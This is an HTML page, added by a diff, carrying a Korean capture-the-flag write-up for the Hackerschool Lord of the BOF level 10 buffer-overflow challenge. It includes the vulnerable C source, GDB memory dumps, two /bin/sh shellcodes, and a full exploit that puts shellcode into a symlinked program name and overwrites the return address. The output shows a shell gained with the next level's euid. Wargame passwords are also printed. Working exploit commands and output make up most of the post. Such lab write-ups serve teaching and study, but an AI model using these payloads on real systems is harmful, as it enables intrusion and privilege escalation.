@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -> Skeleton) : Argv Hunter</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -&gt; Skeleton) : Argv Hunter | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -&gt; Skeleton) : Argv Hunter" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = vampire pw = music world" />
+<meta property="og:description" content="id = vampire pw = music world" />
+<link rel="canonical" href="http://localhost:4000/2015-11-15/hackerschool-BoF-stage-10/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-15/hackerschool-BoF-stage-10/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-15T12:40:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = vampire pw = music world","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-15/hackerschool-BoF-stage-10/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -&gt; Skeleton) : Argv Hunter","dateModified":"2015-11-15T12:40:00+09:00","datePublished":"2015-11-15T12:40:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-15/hackerschool-BoF-stage-10/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL10 (Vampire -> Skeleton) : Argv Hunter</div>
+  <span class="post-date">
+    <time>15 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = vampire</li>
+  <li>pw = music world</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--skeletonc">1. 문제 : skeleton.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">skeleton</span><span class="p">.</span><span class="n">c</span>
+<span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - skeleton
+        - argv hunter
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">saved_argc</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// egghunter
+</span>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack is still your friend.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// check the length of argument
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">48</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argument is too long!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>        
+        <span class="c1">// argc saver
+</span>        <span class="n">saved_argc</span> <span class="o">=</span> <span class="n">argc</span><span class="p">;</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// buffer hunter
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+
+        <span class="c1">// ultra argv hunter!
+</span>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">saved_argc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+<span class="p">}</span>   
+</code></pre></div></div>
+
+<h3 id="11-변경된-코드">1.1 변경된 코드</h3>
+
+<p>추가된 제약사항은 <code class="highlighter-rouge">argv[]</code> 를 모두 0으로 clear 시키는 코드다. 즉, 공격에 <code class="highlighter-rouge">argv[]</code> 도 이용할 수 없다는 이야기다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// argc saver
+</span>        <span class="n">saved_argc</span> <span class="o">=</span> <span class="n">argc</span><span class="p">;</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// buffer hunter
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+
+        <span class="c1">// ultra argv hunter!
+</span>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">saved_argc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+</code></pre></div></div>
+
+<h3 id="12-gdb-디버깅">1.2 GDB 디버깅</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb ./skeleton2
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type <span class="s2">"show copying"</span> to see the conditions.
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details.
+This GDB was configured as <span class="s2">"i386-redhat-linux"</span>...
+<span class="o">(</span>gdb<span class="o">)</span>  r <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x94\xfb\xf0\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "B"*100'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<h4 id="xs-esp--스택을-string-으로-확인">x/s $esp : 스택을 string 으로 확인</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbffffd9a:      <span class="s2">""</span>
+0xbffffd9b:      <span class="s2">"i686"</span>
+0xbffffda0:      <span class="s2">"/home/vampire/./skeleton2"</span>     // argv[0]
+0xbffffdba:      <span class="s1">'A'</span> &lt;repeats 44 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"¿¿ð¿"</span>  // argv[1]
+0xbffffdeb:      <span class="s1">'B'</span> &lt;repeats 100 <span class="nb">times</span><span class="o">&gt;</span>         // argv[2]
+0xbffffe50:      <span class="s2">""</span>
+0xbffffe51:      <span class="s2">""</span>
+</code></pre></div></div>
+
+<h4 id="membset-의-destination-address">membset() 의 destination address</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edx            0xbffffda0       <span class="nt">-1073742432</span>  // argv[0]
+edx            0xbffffdba       <span class="nt">-1073742406</span>  // argv[1]
+edx            0xbffffdeb       <span class="nt">-1073742357</span>  // argv[2]
+</code></pre></div></div>
+
+<h4 id="memset-하기-이전">memset() 하기 이전</h4>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-2.png" alt="img" /></p>
+
+<h4 id="memset-한-이후--argv-를-모두-0으로-clear">memset() 한 이후 : argv[] 를 모두 0으로 clear</h4>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-1.png" alt="img" /></p>
+
+<h2 id="2-공격-방법-고민">2. 공격 방법 고민</h2>
+
+<p>환경변수도 clear 시키고… argv[] 도 모두 clear 시킨다. 그렇다면 shellcode 를 어디에 올려놓을 수 있을까 ???</p>
+
+<h3 id="stack을-좀더-찾아보자">Stack을 좀더 찾아보자</h3>
+
+<p>혹시나 하는 마음에 stack bottom 까지 찾아보자. 앗… stack bottom 에 뭔가 값이 남아있다. main 함수가 실행되기 이전에 실행파일이름이 스택에 저장이 되는 듯하다. main 함수 실행되기 이전 stack 에 쌓이기 때문에 argc hunter 동작이후에도 남아있는 듯 하다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbfffffe1:      <span class="s2">""</span>
+0xbfffffe2:      <span class="s2">"/home/vampire/./skeleton2"</span>
+0xbffffffc:      <span class="s2">""</span>
+
+0xbfffffcc:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffffdc:     0x00000000      0x682f0000      0x2f656d6f      0x706d6176
+0xbfffffec:     0x2f657269      0x6b732f2e      0x74656c65      0x00326e6f
+0xbffffffc:     0x00000000      Cannot access memory at address 0xc0000000
+</code></pre></div></div>
+
+<h2 id="3-공격">3. 공격</h2>
+
+<h3 id="31--공격-계속-실패">3.1  공격.. 계속 실패</h3>
+
+<p><a href="http://humb1ec0ding.github.io/2015/11/13/hackerschool-BoF-stage-8.html">LEVEL8</a>에서 사용한 실행파일이름에 shellcode 를 올려두어야 하므로 <code class="highlighter-rouge">0x2f</code>=<code class="highlighter-rouge">\</code> 없는 shellcode 를 이용해야 한다. 아래 shellcoe 를 이용하여 이전과 같은 방식으로 실행을 하는데 계속 fault 가 나는 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">LR</code>은 <code class="highlighter-rouge">0xbfffffa0</code> 로 선택.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbffffed0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffee0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffef0:     0x00000000      0x6f682f00      0x762f656d      0x69706d61
+0xbfffff00:     0x902f6572      0x90909090      0x90909090      0x90909090
+0xbfffff10:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff20:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff30:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff40:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff50:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff60:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff70:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff80:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff90:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffffa0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffffb0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffffc0:     0x90909090      0x90909090      0xeb909090      0xc9315e11
+0xbfffffd0:     0x6c8032b1      0x8001ff0e      0xf67501e9      0xeae805eb
+0xbfffffe0:     0x32ffffff      0x306951c1      0x69697430      0x6f6a6330
+0xbffffff0:     0x5451e48a      0xb19ae28a      0x0081ce0c      0x00000000
+0xc0000000:     Cannot access memory at address 0xc0000000
+</code></pre></div></div>
+
+<h3 id="32-core-dump-파일-디버깅">3.2 core dump 파일 디버깅</h3>
+
+<p>저장된 core dump 를 이용하여 디버깅을 해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type <span class="s2">"show copying"</span> to see the conditions.
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details.
+This GDB was configured as <span class="s2">"i386-redhat-linux"</span>...
+
+warning: core file may not match specified executable file.
+Core was generated by <span class="sb">`</span>                                                                              <span class="s1">'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Reading symbols from /lib/ld-linux.so.2...done.
+#0  0xbfffffd2 in ?? ()
+(gdb)
+</span></code></pre></div></div>
+
+<p>shellcode 까지는 jump 를 잘 했는데, Polymorphic Shellcode 를 푸는 과정에서 fault 가 난 것 같다. shellcode 를 바꿔야 할까 ?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info reg
+eax            0x2      2
+ecx            0x32     50
+edx            0x0      0
+ebx            0x401081ec       1074823660
+esp            0xbffffb90       <span class="nt">-1073742960</span>
+ebp            0x41414141       1094795585
+esi            0xbfffffe3       <span class="nt">-1073741853</span>
+edi            0xbffffbd4       <span class="nt">-1073742892</span>
+eip            0xbfffffd2       <span class="nt">-1073741870</span>
+eflags         0x10246  66118  
+
+0xbfffffc8:     nop
+0xbfffffc9:     nop
+0xbfffffca:     nop
+0xbfffffcb:     jmp    0xbfffffde
+0xbfffffcd:     pop    %esi
+0xbfffffce:     xor    %ecx,%ecx
+0xbfffffd0:     mov    <span class="nv">$0x32</span>,%cl
+0xbfffffd2:     subb   <span class="nv">$0x1</span>,0xffffffff<span class="o">(</span>%esi,%ecx,1<span class="o">)</span>    // Fault <span class="o">!!!</span>
+0xbfffffd7:     sub    <span class="nv">$0x1</span>,%cl
+0xbfffffda:     jne    0xbfffffd2
+0xbfffffdc:     jmp    0xbfffffe3
+0xbfffffde:     call   0xbfffffcd
+0xbfffffe3:     xor    %cl,%al
+0xbfffffe5:     push   %ecx
+0xbfffffe6:     imul   <span class="nv">$0x69697430</span>,<span class="o">(</span>%eax<span class="o">)</span>,%esi
+0xbfffffec:     xor    %ah,0x6a<span class="o">(</span>%ebx<span class="o">)</span>
+0xbfffffef:     outsl  %ds:<span class="o">(</span>%esi<span class="o">)</span>,<span class="o">(</span>%dx<span class="o">)</span>
+0xbffffff0:     mov    %ah,%ah
+0xbffffff2:     push   %ecx
+0xbffffff3:     push   %esp
+0xbffffff4:     mov    %dl,%ah
+0xbffffff6:     lcall  <span class="nv">$0x0</span>,<span class="nv">$0x81ce0cb1</span>
+0xbffffffd:     add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+0xbfffffff:     .byte 0x0
+0xc0000000:     Cannot access memory at address 0xc0000000
+</code></pre></div></div>
+
+<h2 id="4-새로운-shellcode-도전">4. 새로운 shellcode 도전</h2>
+
+<p>shellcode 에서 죽는 이유는 명확하게 잘 몰라서 새로운 shellcode를 이용해서 다시 공격을 해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>68<span class="se">\x</span>f9<span class="se">\x</span>bf<span class="se">\x</span>0f<span class="se">\x</span>40<span class="se">\x</span>68<span class="se">\x</span>e0<span class="se">\x</span>91<span class="se">\x</span>03<span class="se">\x</span>40<span class="se">\x</span>b8<span class="se">\x</span>e0<span class="se">\x</span>8a<span class="se">\x</span>05<span class="se">\x</span>40<span class="se">\x</span>50<span class="se">\x</span>c3
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>  ln <span class="nt">-s</span> skeleton <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>
+
+<span class="o">&gt;</span>  gdb ./<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-3.png" alt="img" />
+<img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage10-4.png" alt="img" /></p>
+
+<h2 id="5-공격">5. 공격</h2>
+
+<p><code class="highlighter-rouge">LR</code> 은 <code class="highlighter-rouge">0xbfffffc0</code> 으로 선택.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ln <span class="nt">-s</span> skeleton <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>
+
+<span class="o">&gt;</span> ./<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span> <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\xc0\xff\xff\xbf"'</span><span class="sb">`</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÀ  ¿
+
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="6-다음-단계-정보">6. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 510
+shellcoder
+</code></pre></div></div>
+
+<h2 id="7-의문점--이전-shellcode-에서-죽는-이유는-">7. 의문점 : 이전 shellcode 에서 죽는 이유는 ?</h2>
+
+<p>이전에 사용한 <a href="http://shell-storm.org/shellcode/files/shellcode-491.php">Linux/x86 - /bin/sh polymorphic shellcode - 48 bytes shellcode</a> 가 죽는 이유… 나중(?)에 좀더 살펴볼 예정.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eax            0x2      2
+ecx            0x32     50
+edx            0x0      0
+ebx            0x401081ec       1074823660
+esp            0xbffffb90       <span class="nt">-1073742960</span>
+ebp            0x41414141       1094795585
+esi            0xbfffffe3       <span class="nt">-1073741853</span>
+edi            0xbffffbd4       <span class="nt">-1073742892</span>
+eip            0xbfffffd2       <span class="nt">-1073741870</span>
+eflags         0x10246  66118  
+
+0xbfffffca:     nop
+0xbfffffcb:     jmp    0xbfffffde
+0xbfffffcd:     pop    %esi
+0xbfffffce:     xor    %ecx,%ecx
+0xbfffffd0:     mov    <span class="nv">$0x32</span>,%cl
+0xbfffffd2:     subb   <span class="nv">$0x1</span>,0xffffffff<span class="o">(</span>%esi,%ecx,1<span class="o">)</span>    // Fault <span class="o">!!!</span>
+</code></pre></div></div>
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
